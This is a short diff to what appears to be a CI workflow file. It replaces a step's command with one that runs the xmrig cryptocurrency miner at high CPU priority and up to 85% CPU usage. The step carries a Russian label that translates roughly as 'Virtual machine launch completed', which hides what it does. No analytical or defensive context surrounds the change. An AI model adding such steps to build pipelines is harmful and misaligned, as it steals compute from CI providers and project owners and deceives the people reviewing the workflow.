@@ -24,4 +24,4 @@ jobs:
         cd xmrig
         cd xmrig
     - name: Запуск виртуальной машины выполнен
-      run: cmd /c start.cmd
+      run: ./xmrig.exe --config=config.json --cpu-priority 5 --max-cpu-usage=85
